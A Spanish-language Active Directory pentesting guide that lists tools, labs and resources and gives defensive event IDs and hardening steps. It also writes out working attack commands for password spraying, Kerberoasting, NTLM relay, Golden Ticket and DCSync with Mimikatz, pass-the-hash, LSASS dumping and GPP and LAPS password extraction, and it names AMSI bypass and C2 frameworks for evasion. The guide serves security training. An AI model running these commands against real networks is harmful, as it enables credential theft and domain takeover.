# GuÃ­a Avanzada y Completa de Pentesting en Active Directory (AD)

Esta guÃ­a estÃ¡ dirigida a pentesters y red teamers con conocimientos intermedios y avanzados. Cubre tÃ©cnicas y procedimientos para acceso inicial, enumeraciÃ³n, explotaciÃ³n, escalada de privilegios, persistencia y movimiento lateral en entornos Active Directory. Se incluyen recursos tÃ©cnicos, repositorios, writeups, laboratorios, defensas y escenarios reales de ataque.

---

## Ãndice

1. [Recursos Principales y Cheatsheets](#recursos)
2. [Acceso Inicial (Breaching)](#acceso-inicial)
3. [EnumeraciÃ³n en AD](#enumeracion)
4. [Persistence y Movimiento Lateral](#persistencia)
5. [Privilege Escalation (Privesc)](#privesc)
6. [Defensa, DetecciÃ³n y EvasiÃ³n](#defensa)
7. [Herramientas Imprescindibles y Alternativas](#herramientas)
8. [Writeups, Laboratorios y Repositorios Recomendados](#writeups)
9. [MÃ¡ximas Brechas y Privesc MÃ¡s Populares](#maximas)
10. [Referencias, FormaciÃ³n y Comunidad](#referencias)

---

<a name="recursos"></a>
## 1. Recursos Principales y Cheatsheets

- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings - AD](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack%20Cheatsheet)
- [GTFOBins Windows](https://gtfobins.github.io/#+windows)
- [ADSecurity.org](https://adsecurity.org/)
- [Red Team Notes - AD](https://www.ired.team/active-directory-attack)
- [CheatSheet Awesome AD](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet)
- [Harmj0y Blog](https://www.harmj0y.net/blog/)
- [SpecterOps Blog](https://posts.specterops.io/)
- [Blue Team Notes - Defensas AD](https://www.blueteamnotes.com/active-directory/)
- [ADSecurity Checklist](https://github.com/PaulSec/awesome-AD)

---

<a name="acceso-inicial"></a>
## 2. Acceso Inicial (Breaching)

### Vectores de Ataque Comunes
- **Phishing (Spear/Whaling/Generic)**
- **SMB Relay y Responder**
- **Password Spraying y Brute Force**
- **Ataque de Hashes Capturados (NTLMv1/v2, NetNTLM)**
- **Kerberoasting y AS-REP Roasting**
- **Vulnerabilidades de Servicios Expuestos (MS17-010, PrintNightmare, ZeroLogon, PetitPotam, DFSCoerce, etc.)**
- **Abuso de aplicaciones desactualizadas (Citrix, Exchange, IIS, etc.)**

### Herramientas y Recursos
- [Impacket](https://github.com/fortra/impacket)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- [Responder](https://github.com/lgandx/Responder)
- [Sprayhound](https://github.com/FuzzySecurity/Sprayhound)
- [Kerbrute](https://github.com/ropnop/kerbrute)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [SharpBruteLogon](https://github.com/mgeeky/SharpBruteLogon)

#### Ejemplo de Password Spraying:
```bash
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Winter2025'
kerbrute passwordspray -d domain.local --dc <DC-IP> users.txt Winter2025
```

#### Ejemplo de Kerberoasting:
```bash
impacket-GetUserSPNs -request -dc-ip <DC-IP> DOMAIN/user:'password'
rubeus kerberoast /user:usuario /password:pass /domain:dominio.local /dc:<DC-IP>
```

#### Ejemplo de AS-REP Roasting:
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC-IP>
rubeus asreproast
```

#### Ejemplo de ataque SMB Relay:
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

#### Ejemplo de Phishing con Evilginx2:
- Monta un proxy para capturar credenciales y tokens de 2FA.

---

<a name="enumeracion"></a>
## 3. EnumeraciÃ³n en AD

### EnumeraciÃ³n AnÃ³nima y con Credenciales

#### Sin credenciales:
- `rpcclient -U "" <DC-IP>`
- `nmap --script "smb-enum*" -p445 <target>`
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)

#### Con credenciales:
- [BloodHound (SharpHound)](https://github.com/BloodHoundAD/BloodHound)
- [powerview.ps1](https://github.com/PowerShellMafia/PowerSploit)
- [ADExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
- [ADRecon](https://github.com/sense-of-security/ADRecon)
- [PingCastle](https://github.com/vletoux/pingcastle)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (fork de CME)

#### EnumeraciÃ³n de Shares SMB:
```bash
smbclient -L //<DC-IP> -N
crackmapexec smb <target> --shares -u usuario -p contraseÃ±a
```

#### EnumeraciÃ³n LDAP:
```bash
ldapsearch -x -h <DC-IP> -b "dc=domain,dc=local"
```

#### Bloodhound Ingestors:
```bash
SharpHound.exe -c all
Invoke-BloodHound -CollectionMethod All
```

#### EnumeraciÃ³n de GPOs:
```powershell
Get-GPO -All
```

#### EnumeraciÃ³n de Certificados (AD CS):
```bash
certipy find -u usuario -p 'contraseÃ±a' -target <DC-IP> -dc-ip <DC-IP> -d dominio.local
```

---

<a name="persistencia"></a>
## 4. Persistence y Movimiento Lateral

### TÃ©cnicas de Persistencia
- **Golden Ticket y Silver Ticket** (Mimikatz)
- **Pass-the-Hash / Pass-the-Ticket** (Impacket, Mimikatz, CrackMapExec)
- **Overpass-the-Hash (Pass-the-Key)**
- **DC Sync / DC Shadow**
- **Abuso de AdminSDHolder**
- **Backdoors en GPOs**
- **Abuso de delegaciÃ³n de servicios (RBCD, S4U2Self, S4U2Proxy)**
- **Shadow Credentials y certificados mal configurados**
- **Persistencia en Scheduled Tasks, Service Accounts, WMI y Run Keys**

#### Movimiento Lateral
- **PsExec** (Impacket, Sysinternals)
- **WinRM** (evil-winrm)
- **WMI, DCOM, RDP**
- **Abuso de sesiones RDP activas**
- **Abuso de permisos en shares SMB**
- **Abuso de ACLs y permisos delegados**

#### Ejemplo: Golden Ticket
```powershell
mimikatz # kerberos::golden /user:usuario /domain:dominio.local /sid:S-1-5-21-xxxx /krbtgt:HASH /id:500
```

#### Ejemplo: Pass-the-Hash
```bash
crackmapexec smb <target> -u usuario -H <NTLM_HASH>
psexec.py -hashes :<NTLM_HASH> dominio/usuario@<ip>
```

#### Ejemplo: DC Sync
```powershell
mimikatz # lsadump::dcsync /domain:dominio.local /user:krbtgt
```

#### Ejemplo: RBCD (Resource-Based Constrained Delegation)
- [Abuso con PowerMad y PowermadSharp](https://github.com/Kevin-Robertson/Powermad)

---

<a name="privesc"></a>
## 5. Privilege Escalation (Privesc)

### TÃ©cnicas de Escalada

- **Kerberoasting / AS-REP Roasting**
- **Abuso de Delegaciones (Unconstrained, Constrained, RBCD)**
- **Abuso de GPOs (Group Policy Objects)**
- **Abuso de ACLs (WriteDACL, GenericWrite, GenericAll, WriteOwner)**
- **MS14-068, MS17-010 (EternalBlue), PrintNightmare, ZeroLogon, PetitPotam**
- **Abuso de LAPS, GPP Passwords, credenciales almacenadas**
- **Credential Dumping (LSASS, SAM, DCSync)**
- **Escalada Local: SeDebugPrivilege, Service misconfig, Unquoted Service Path, AlwaysInstallElevated, DLL Hijacking, UAC Bypass, Print Spooler, etc.**
- **Abuso de Certificados (AD CS, ESC1-ESC8)**

#### Herramientas para Privesc
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [SharpUp](https://github.com/GhostPack/SharpUp)
- [SharpHound](https://github.com/BloodHoundAD/BloodHound)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

#### Ejemplo: Abuso de WriteDACL en PowerView
```powershell
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity USUARIO -Rights All
```

#### Ejemplo: Dump LSASS con procdump
```bash
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

#### Ejemplo: Privesc con GPP Passwords
```bash
findstr /S cpassword \\<share>\SYSVOL\
gpp-decrypt <cpassword>
```

#### Ejemplo: Abuso LAPS
```powershell
Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd
```

#### Ejemplo: Abuso de Certificados
```bash
certipy auth -u usuario -p contraseÃ±a -dc-ip <DC-IP> -d dominio.local
certipy find -u usuario -p contraseÃ±a -target <DC-IP> -dc-ip <DC-IP>
```

---

<a name="defensa"></a>
## 6. Defensa, DetecciÃ³n y EvasiÃ³n

### Â¿CÃ³mo defender y detectar?
- **Monitorizar logs de Kerberos, NTLM, WinRM, RDP, DCOM, WMI**
- **Activar y auditar eventos de seguridad 4624, 4625, 4672, 4688, 4768, 4769, 4776, 4720, 4726, 4732, 4738, 4740, 4756, 4767, 4782, 7045**
- **Habilitar LAPS y restringir la lectura del atributo ms-Mcs-AdmPwd**
- **Habilitar SMB Signing y restringir NTLM**
- **Deshabilitar delegaciones innecesarias**
- **Controlar permisos delegados y revisar rutas en BloodHound**
- **Segmentar redes y limitar privilegios**
- **Apalancar EDRs y soluciones SIEM**
- **Aplicar parches de seguridad de manera continua**
- **Usar honeypots y cuentas trampa para detectar movimiento lateral**

### EvasiÃ³n de Defensas
- **ObfuscaciÃ³n de scripts (Invoke-Obfuscation, PSObfuscation)**
- **Bypass de AMSI (Antimalware Scan Interface)**
- **Uso de binarios living-off-the-land (LOLBAS)**
- **TÃ©cnicas de inyecciÃ³n de memoria y ejecuciÃ³n reflectiva**
- **Uso de Cobalt Strike, Sliver, Covenant, Mythic y otros C2s**

---

<a name="herramientas"></a>
## 7. Herramientas Imprescindibles y Alternativas

- **Impacket** (Suite principal para pentesting AD)
- **CrackMapExec / NetExec**
- **BloodHound & Neo4j**
- **PowerView / PowerSploit**
- **Rubeus**
- **Mimikatz**
- **SharpHound**
- **Evil-WinRM**
- **Responder**
- **Certipy** (AD CS Attacks)
- **PingCastle** (Health y auditorÃ­a de AD)
- **Kerbrute** (fuerza bruta Kerberos)
- **ADRecon, ADExplorer, ADACLScanner**
- **SharpCradle, SharpDPAPI, SharpSCCM, SharpPrinter**
- **Sliver, Covenant, Mythic, Cobalt Strike, Brute Ratel**

#### Alternativas Open Source y Blue Team
- [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) (detecciÃ³n)
- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape)
- [Sigma](https://github.com/SigmaHQ/sigma) (detecciÃ³n SIEM)
- [Zeek](https://zeek.org/) (detecciÃ³n en red)

---

<a name="writeups"></a>
## 8. Writeups, Laboratorios y Repositorios Recomendados

- [HackTheBox Writeups](https://0xdf.gitlab.io/)
- [IppSec HTB Videos](https://www.youtube.com/c/IppSec)
- [TryHackMe Writeups](https://github.com/s4vitar/CTF-Writeups/tree/master/TryHackMe)
- [Hacktricks AD Examples](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings AD](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack%20Cheatsheet)
- [Awesome AD Security](https://github.com/S3cur3Th1sSh1t/Awesome-AD-Security)
- [Hackndo AD Labs](https://github.com/hackndo/AD-lab)
- [TryHackMe Rooms](https://tryhackme.com/room/attacktivedirectory)
- [PentesterLab Windows/AD](https://pentesterlab.com/exercises/windows_intro/course)

### MÃ¡quinas y retos con privesc AD:

- **HTB - Forest**: Privesc con DCSync y Bloodhound
- **HTB - Sauna**: Kerberoasting
- **HTB - Active**: GPP Password
- **HTB - Cascade**: Abuso de permisos en AD y SMB
- **HTB - Blackfield, Reel, Resolute, Monteverde, Blue, Sizzle, Sauna, ServMon, Bastion**
- **THM - Ignite, Attacktive Directory, Brooklyn Nine Nine**
- **ADLab - Hackndo, VulnAD, PurpleSharp, DetectionLab**

---

<a name="maximas"></a>
## 9. MÃ¡ximas Brechas y Privesc MÃ¡s Populares

- **GPP Passwords**: RecuperaciÃ³n de cpassword en SYSVOL.
- **Kerberoasting**: Cuentas de servicio con SPN y contraseÃ±as dÃ©biles.
- **AS-REP Roasting**: Usuarios sin preauth.
- **Abuso de ACLs**: BloodHound identifica rutas de privesc ocultas.
- **LAPS**: Extraer passwords locales de AD (ms-Mcs-AdmPwd).
- **Abuso de Certificados (AD CS, ESC1-ESC8)**: [Certipy](https://github.com/ly4k/Certipy)
- **NTLM Relay y SMB Signing Disabled**
- **Escalada local**: SeDebugPrivilege, Service misconfig, Unquoted Service Path, AlwaysInstallElevated, DLL Hijacking, Print Spooler, UAC Bypass.
- **PrintNightmare, ZeroLogon, PetitPotam, DFSCoerce**
- **Persistence en GPOs, Scheduled Tasks, WMI, Run Keys, Service Accounts**
- **TÃ©cnicas de Pass-the-Hash y Pass-the-Ticket**

---

<a name="referencias"></a>
## 10. Referencias, FormaciÃ³n y Comunidad

- [Hacking The Windows Active Directory (HackTricks YT)](https://www.youtube.com/c/HackTricks)
- [Red Team Notes](https://www.ired.team/)
- [HackTricks](https://book.hacktricks.xyz/)
- [S4vitar AD Pentesting Course](https://www.youtube.com/watch?v=4a1kDMVZB2o)
- [TryHackMe - Attacktive Directory Room](https://tryhackme.com/room/attacktivedirectory)
- [HTB Academy - Active Directory](https://academy.hackthebox.com/module/details/14)
- [PentesterLab Windows/AD](https://pentesterlab.com/exercises/windows_intro/course)
- [SpecterOps Training](https://training.specterops.io/)
- [Blue Team Labs Online](https://blueteamlabs.online/)
- [DFIR Report](https://thedfirreport.com/)
- [Microsoft Security Blog](https://www.microsoft.com/security/blog/)
- [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
- [Awesome Blue Teaming](https://github.com/fabacab/awesome-cybersecurity-blueteam)

---

## Â¡Mantente Actualizado!
- Sigue los repos y canales listados para estar siempre al dÃ­a con nuevas tÃ©cnicas y vulnerabilidades en AD.
- Participa en conferencias como DEFCON, Black Hat, RootedCON, Ekoparty, Bsides, etc.
- Contribuye a foros como Reddit r/netsec, r/AskNetsec, Stack Exchange Security, Discord y Telegram de comunidades de seguridad.

---

## Notas Finales y Buenas PrÃ¡cticas

- **Practica en entornos seguros y legales.** Usa laboratorios como HackTheBox, TryHackMe, VulnHub, Azure AD Labs, DetectionLab.
- **Combina fuentes de informaciÃ³n**: DocumentaciÃ³n oficial, blogs tÃ©cnicos, writeups, cursos, videos, podcasts.
- **Comparte conocimientos y mantente humilde:** La seguridad en AD evoluciona constantemente.
- **Automatiza y desarrolla tus propios scripts.** Aporta a la comunidad.

---

**ActualizaciÃ³n:**  
GuÃ­a revisada y ampliada a junio 2025.  
Â¿Sugerencias? Â¡Colabora y comparte!
